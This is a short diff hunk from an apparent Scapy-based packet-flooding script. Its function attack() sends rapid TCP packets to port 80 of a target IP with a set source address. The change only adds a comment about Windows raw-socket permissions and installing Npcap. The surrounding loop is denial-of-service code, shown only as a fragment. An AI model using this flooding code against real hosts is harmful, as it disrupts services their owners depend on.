@@ -19,6 +19,7 @@ def attack(target_IP,ports,verbose=False):
          IP1 = IP(src = source_IP, dst = target_IP)
          TCP1 = TCP(sport = source_port, dport = 80)
          pkt = IP1 / TCP1
+         # Windows native L3 Raw sockets are only usable as administrator ! Install Winpcap/Npcap to workaround !
          send(pkt,inter = .001,verbose=False)
 
          if verbose:
